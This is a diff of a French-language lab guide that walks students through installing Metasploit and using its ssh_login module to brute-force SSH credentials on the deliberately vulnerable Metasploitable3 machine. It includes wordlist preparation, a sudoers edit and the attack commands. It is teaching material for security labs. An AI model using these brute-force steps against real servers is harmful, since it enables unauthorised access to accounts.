@@ -1,23 +1,63 @@
 ## LAB6 - PARTIE2 - Configuration et Utilisation de Metasploit pour Attaque par Force Brute SSH
 
-### Description
+# 1 -  Description
 Ce document fournit des instructions détaillées pour utiliser Metasploit afin de lancer une attaque par force brute SSH contre une machine cible, en l'occurrence Metasploitable3. Ce guide couvre la préparation des fichiers nécessaires, la configuration de Metasploit, et le lancement de l'attaque.
 
-### Prérequis
+# 2 -  Prérequis
+- Un ordinateur ou une machine virtuelle avec Ubuntu 22.04 installé.
+- Accès à un compte avec des privilèges d'administrateur.
 - **Système d'exploitation**: Linux (Ubuntu 22.04 préféré)
 - **Metasploit Framework installé**
 - **Accès administratif sur la machine où Metasploit est installé**
 - **Machine cible configurée et accessible sur le réseau**
 
-### Installation de Metasploit (si non installé)
+# 3 - Ajout de l'Utilisateur `eleve` au Fichier sudoers
+1. **Ouvrez un terminal.**
+2. Devenez superutilisateur pour modifier les fichiers de configuration système:
+   ```bash
+   su
+   ```
+3. Éditez le fichier sudoers pour ajouter des privilèges administratifs à `eleve`:
+   ```bash
+   visudo
+   ```
+4. Ajoutez la ligne suivante pour donner à `eleve` les droits sudo:
+   ```
+   eleve ALL=(ALL) ALL
+   ```
+5. **Enregistrez et quittez** l'éditeur. Utilisez `CTRL+X`, suivi de `Y` pour enregistrer si vous utilisez `nano` comme éditeur dans `visudo`.
+
+6. Tapez `exit` pour retourner à la session de l'utilisateur `eleve`.
+
+
+# 4 - (MÉTHODE#1) Installation de Metasploit (si non installé)
 1. Ouvrez un terminal.
 2. Exécutez les commandes suivantes pour installer Metasploit:
    ```bash
    sudo apt update
    sudo apt install metasploit-framework
    ```
+# 4 - (MÉTHODE#2) Installation de Metasploit Framework
+1. **Ouvrez un terminal sous le compte `eleve`.**
+2. Mettez à jour les paquets et installez les dépendances:
+   ```bash
+   sudo apt update
+   sudo apt install curl gnupg2 software-properties-common
+   ```
+3. **Ajoutez le dépôt officiel de Metasploit**:
+   ```bash
+   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+   chmod 755 msfinstall
+   sudo ./msfinstall
+   ```
+4. **Vérifiez l'installation** en démarrant Metasploit:
+   ```bash
+   msfconsole
+   ```
 
-### Étape 1: Préparation des Fichiers de Noms d'Utilisateurs et de Mots de Passe
+
+
+# 5 - Étape 1: Préparation des Fichiers de Noms d'Utilisateurs et de Mots de Passe
 1. **Création des fichiers** :
    - Créez les fichiers contenant les noms d'utilisateurs et les mots de passe que vous prévoyez d'utiliser pour l'attaque.
      ```bash
@@ -39,21 +79,27 @@ Ce document fournit des instructions détaillées pour utiliser Metasploit afin 
      sudo chown $(whoami) /home/eleve/passwords.txt
      ```
 
-### Étape 2: Déplacement des Fichiers dans un Répertoire Accessible par Metasploit
+# 6 - Étape 2: Déplacement des Fichiers dans un Répertoire Accessible par Metasploit
 - Déplacez les fichiers dans un répertoire où Metasploit a les permissions de lecture.
   ```bash
   sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
   sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
   ```
 
-### Étape 3: Configuration de Metasploit
-1. **Lancement de Metasploit** :
+# 7 - Étape 3: Configuration de Metasploit
+
+1. ** Initialisation de la Base de Données Metasploit
+- Initialisez la base de données PostgreSQL pour Metasploit** (ce qui améliore les performances de Metasploit et permet la persistance des données entre les sessions):
+   ```bash
+   msfdb init
+   ```
+2. **Lancement de Metasploit** :
    - Ouvrez Metasploit en utilisant la commande suivante :
      ```bash
      msfconsole
      ```
 
-2. **Configuration du module SSH** :
+3. **Configuration du module SSH** :
    - Configurez Metasploit pour utiliser les fichiers déplacés et ciblez la machine appropriée.
      ```bash
      use auxiliary/scanner/ssh/ssh_login
@@ -63,7 +109,7 @@ Ce document fournit des instructions détaillées pour utiliser Metasploit afin 
      set VERBOSE true
      ```
 
-### Étape 4: Lancement de l'Attaque
+# 7 -  Étape 4: Lancement de l'Attaque
 - Exécutez le module pour commencer l'attaque.
   ```bash
   run
